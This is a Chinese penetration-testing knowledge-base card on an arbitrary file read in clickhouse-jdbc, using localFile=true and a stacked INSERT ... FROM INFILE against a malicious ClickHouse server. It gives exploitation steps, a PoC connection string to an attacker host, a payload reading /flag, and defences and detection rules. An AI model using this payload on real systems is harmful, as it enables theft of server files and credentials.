---
id: web-java-component-clickhouse-jdbc-localfile-stacked-infile-read
title: clickhouse-jdbc localFile + 堆叠 INSERT FROM INFILE：恶意 ClickHouse 服务端读取应用服务器任意文件
type: scenario
domain: web
path: web/java/component
technique: clickhouse-jdbc-localfile-infile-client-file-read
tags:
- java
- jdbc
- clickhouse
- arbitrary-file-read
- malicious-server
- stacked-query
- datasource
cve: []
severity: high
confidence: high
affected_versions: clickhouse-jdbc 0.4.2 起支持 localFile（原文抓包驱动 0.4.2；DataEase 案例使用 0.4.6）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V421
  verified_at: '2026-11-09T16:34:08+08:00'
  notes: '已对照原文与图01-04核对：0.4.2 起 localFile 选项、useLocalFile()/hasFile()/ClickHouseUtils.unescape 源码、默认 parsedStmts 逐条堆叠执行、0.4.2 驱动将 win.ini 作为 POST 请求体（x-clickhouse-format: RawBLOB）发往恶意服务端，均与原文一致。与既有 AJ-Report/泛微 E10 的 MySQL LOAD DATA LOCAL INFILE 卡相比驱动/协议/触发方式不同，非重复；与 DataEase CVE 卡为通用原语 vs 产品落地，分工明确。affected_versions 与原文『0.4.2 版本后支持 localFile』及抓包 0.4.2 一致，保留。无 CVE，无 sources/source 字段与文章 ID/URL 泄露，path 存在。未复跑。'
url: /docs/web/java/component/web-java-component-clickhouse-jdbc-localfile-stacked-infile-read/
draft: false
kb_aliases:
- clickhouse-jdbc 任意文件读取
- ClickHouse localFile
- INSERT INTO ... FROM INFILE
- FORMAT RawBLOB
- 恶意 ClickHouse 服务端读文件
- JDBC 客户端文件读取
---

## 一句话结论

当应用允许用户控制 ClickHouse 数据源的 JDBC URL/额外参数且有执行 SQL 的功能点时，攻击者可把连接指向自己的 ClickHouse，并在 URL 中加入 `localFile=true`，再用堆叠语句 `INSERT INTO <表> FROM INFILE '<路径>' FORMAT RawBLOB` 让 clickhouse-jdbc 驱动读取应用服务器本地文件并作为 HTTP 请求体发给恶意服务端，从而把「连数据库」变成任意文件读取。

## 原理

- **JDBC 驱动的攻击面在 URL 属性**：JDBC 由 SPI 加载各厂商驱动，驱动行为大量由连接串/属性控制。若业务把用户提交的 JDBC URL 与额外参数原样交给驱动，攻击者就能开启驱动中为兼容性保留的本地文件能力。
- **与 MySQL LOAD DATA LOCAL 的差异**：MySQL 恶意服务端可以在任意查询后回复文件传输请求，客户端驱动随即把本地文件内容回传，因此仅建立连接即可触发；ClickHouse 客户端与服务端走 HTTP，无法用自定义协议在连接阶段发起文件请求，单纯连接不能直接利用。
- **ClickHouse 的替代路径**：clickhouse-jdbc 从 0.4.2 起支持 `localFile` 选项。驱动默认会把一条 SQL 拆成多条语句逐条执行（源码为 `for (int i ... this.parsedStmts.length ...) processSqlStatement`），因此可以堆叠一条 `INSERT INTO <表> FROM INFILE '<本地路径>' FORMAT RawBLOB`。开启 `useLocalFile()` 时，驱动调用 `ClickHouseUtils.unescape(stmt.getFile())` 解析路径并读取客户端文件，把内容作为 HTTP 请求体发往服务端。
- **恶意服务端收文件**：目标连接的 ClickHouse 由攻击者搭建，攻击者预先建好 `images(data String) Engine = Memory` 一类的接收表；被读取的文件内容会作为一行写入该表，攻击者随后在服务端 `SELECT` 即可拿到内容，整个过程中目标服务器无需回连除 ClickHouse HTTP 端口以外的任何地址。
- **抓包特征**：请求形如 `POST /?query=...INSERT INTO images FORMAT RawBLOB&compress=1...`，`User-Agent: ClickHouse-JdbcDriver/0.4.2 ... HTTPurlConnection`，`x-clickhouse-format: RawBLOB`，请求体即目标本地文件内容（例如 Windows `win.ini` 的 `[fonts]/[extensions]/[mci extensions]` 段）。
- **为什么成立**：`localFile` 是驱动功能而非服务端权限；文件读取发生在**客户端**（运行 JDBC 的应用服务器），读取权限就是 Java 进程权限。攻击者控制服务端意味着可以决定 `INFILE` 的路径与结果去向，只需要应用提供一个能执行多条语句的 SQL 入口。

## 触发条件

- 应用允许用户控制 ClickHouse 数据源的 JDBC URL、主机、端口或额外连接参数（数据源管理、连接测试、报表数据集配置等）。
- 应用存在可执行用户 SQL 的功能点（SQL 数据集、查询控制台、测试查询、报表 SQL 等），且默认允许多条语句执行（clickhouse-jdbc 默认逐条执行）。
- 使用的 clickhouse-jdbc 版本支持 `localFile`（0.4.2+），URL/参数中加入 `localFile=true`，必要时 `compress=0`。
- 目标应用服务器可访问攻击者控制的 ClickHouse HTTP 端口（默认 8123，可自定义如 18124）。
- 目标进程对要读取的文件有读权限（/flag、/etc/passwd、win.ini、应用配置文件、密钥文件等）。

## 利用步骤

1. 在攻击机用 Docker 启动 ClickHouse 服务端并暴露 HTTP 端口：
   `sudo docker run -d -p 18124:8123 -p 19001:9000 clickhouse/clickhouse-server`
2. 在攻击者 ClickHouse 的 `default` 库建立接收表：
   `CREATE TABLE images(data String) Engine = Memory;`
3. 在目标应用的数据源配置中，把 ClickHouse 连接指向攻击机，并在额外 JDBC 参数中填入 `compress=0&localFile=true`（或直接构造 URL `jdbc:clickhouse://<attacker>:18124/default?compress=0&localFile=true`）。
4. 在可执行 SQL 的功能点提交堆叠语句，前一段用于闭合业务包装查询，后一段执行读取：
   `SELECT version());INSERT INTO images FROM INFILE '/flag' FORMAT RawBLOB; -- aaaa`
   前导的 `SELECT version())` 是示例中的闭合片段，实际需按业务包装 SQL 调整括号/引号。
5. 回到攻击者 ClickHouse 执行 `SELECT * FROM images;`，即可看到被读取文件的内容（原文读到 DataEase 容器内 `/flag` 的 `flag{test}`）。
6. 若目标为 Windows，可把路径换成 `C:\\Windows\\win.ini` 等验证；若一次失败，检查驱动版本、`localFile` 是否生效、SQL 是否被拆分执行、目标到攻击机的网络连通性。

## PoC

```sql
-- 攻击者 ClickHouse 侧
CREATE TABLE images(data String) Engine = Memory;
SELECT * FROM images;
```

```text
-- 目标应用侧（额外 JDBC 参数）
compress=0&localFile=true

-- 完整连接串示例
jdbc:clickhouse://<attacker-ip>:18124/default?compress=0&localFile=true
```

```sql
-- 目标应用 SQL 执行点提交
SELECT version());INSERT INTO images FROM INFILE '/flag' FORMAT RawBLOB; -- aaaa
```

```http
POST /?query=%0AINSERT+INTO+images+FORMAT+RawBLOB&compress=1&extreme=0&session_id=<id> HTTP/1.1
Host: <attacker-clickhouse>:18124
user-agent: ClickHouse-JdbcDriver/0.4.2 (Windows 10/10.0; Java HotSpot(TM) 64-Bit Server VM/...; HTTPurlConnection; rv:...)
x-clickhouse-user: default
x-clickhouse-database: default
x-clickhouse-format: RawBLOB
Content-Type: text/plain; charset=UTF-8

<被读取文件的原始内容>
```

说明：原文用 clickhouse-jdbc 0.4.2 抓包证明 win.ini 内容被作为请求体发出，并在 DataEase 1.18.18 上成功读出 `/flag`；本卡未复跑。

## 变体与关联

- **MySQL LOAD DATA LOCAL 路线**：恶意 MySQL 服务端可在连接/查询阶段索取客户端文件，见 [[web-java-component-aj-report-datasource-testconnection-jdbc-local-infile-read]] 与 [[web-java-component-weaver-e10-addmysqlmonitor-jdbc-local-infile-read]]；与 ClickHouse 路线同属「用户可控 JDBC URL + 恶意服务端」，但驱动与协议不同。
- **产品化落地**：见 [[web-java-component-dataease-cve-2024-31441-clickhouse-localfile-file-read]]（DataEase 1.18.18 数据源额外参数注入）。
- **其他 JDBC 攻击**：H2 `INIT=RUNSCRIPT`、`autoDeserialize`、驱动 JAR 上传等，见 [[web-java-component-dataease-json-driver-override-jdbc-rce]]、[[web-java-component-dataease-illegalparameters-client-blacklist-jdbc-autodeserialize]]。
- **方向相反的 ClickHouse 写文件**：服务端权限下的 `INTO OUTFILE` 写 WebShell 见 [[pentest-privilege-escalation-clickhouse-into-outfile]]，与本卡（客户端读文件）区分。

## 检测与防御

- **禁止用户完全控制 JDBC 连接**：数据源只允许从服务端预设的驱动/主机/端口列表选择，URL 模板由服务端拼接；额外连接参数做白名单，显式拒绝 `localFile`、`allowLoadLocalInfile`、`autoDeserialize`、`INIT` 等危险属性。
- **收敛 SQL 执行**：数据集/查询控制台只允许单条只读查询，禁止堆叠语句与 `INSERT INTO ... FROM INFILE`、`INTO OUTFILE` 等服务端文件语句；对 SQL 做语法级校验而非关键字黑名单。
- **网络隔离**：应用服务器出站只放行已批准的数据源地址，阻断对任意地址 8123/数据库端口的连接，恶意服务端接收不到文件。
- **权限最小化**：Java 进程以低权限用户运行，敏感文件（flag、密钥、配置）不对其可读；容器内不要把敏感文件放在应用可读路径。
- **检测**：监控数据源配置中新增的 `localFile`/外部主机；审计 SQL 中的 `INFILE`、`FORMAT RawBLOB`、堆叠分号；对应用发往非白名单 ClickHouse/MySQL 端口的连接告警。
